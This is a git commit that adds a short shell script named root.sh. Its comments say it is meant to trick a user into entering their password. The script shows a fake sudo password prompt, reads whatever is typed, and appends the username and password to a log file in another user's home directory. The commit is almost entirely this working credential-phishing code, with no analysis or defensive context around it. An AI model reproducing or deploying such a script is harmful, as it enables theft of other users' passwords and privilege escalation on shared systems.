35b56f23b5c3e0f736e9ee4b18b9b0c248c19ea6
Senan Sager <senan.senoo.sager@gmail.com>
2021-12-19 00:34:22 +0100

    Create root.sh

---
+++ root.sh
@@ -0,0 +1,12 @@
+#this is a simple script to trick a user to enter their password.
+
+#tell the user to enter their sudu password
+echo "[sudo] password for $USER: "
+
+#lets the user to enter password
+read password
+
+#logs username and password to a file
+echo "$USER - sudu password: $password" >> /home/anotheruser/log
+
+exit
